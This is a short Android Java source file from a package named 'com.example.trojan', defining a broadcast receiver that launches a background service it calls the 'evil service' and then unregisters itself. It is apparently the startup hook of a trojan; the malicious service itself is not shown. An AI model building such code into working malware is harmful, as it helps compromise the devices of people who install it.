package com.example.trojan;
//nobin
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class Starter extends BroadcastReceiver {

@Override
public void onReceive(Context context, Intent intent) {
	
	 
	 
	Log.d(MyService.LOG_TAG, "Starter got onRecieve()!\nStarting evil service!");
	try{

	context.startService(new Intent(context, MyService.class));}
	catch (Exception e){
		Log.d(MyService.LOG_TAG, "error starting evil service!!\n"+e.toString());	
	}		
	try{context.unregisterReceiver(this);}
	catch(Exception e){
		Log.d(MyService.LOG_TAG, "error unregistering Starter");
		
	}
 }

}